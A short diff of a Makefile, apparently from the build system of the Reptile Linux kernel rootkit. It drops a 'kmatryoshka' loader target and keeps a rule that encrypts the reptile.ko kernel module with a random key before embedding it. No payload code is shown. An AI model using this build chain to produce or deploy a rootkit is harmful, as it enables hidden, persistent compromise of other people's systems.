@@ -20,7 +20,7 @@ INCLUDE ?= -I$(PWD)/kernel/include
 LOADER ?= $(PWD)/kernel/loader/loader.c
 INSTALLER ?= $(PWD)/scripts/installer.sh
 
-all: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module kmatryoshka reptile
+all: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module reptile
 
 reptile: $(LOADER)
 	@ $(ENCRYPT) $(BUILD_DIR)/reptile.ko $(RAND2) > $(BUILD_DIR)/reptile.ko.inc
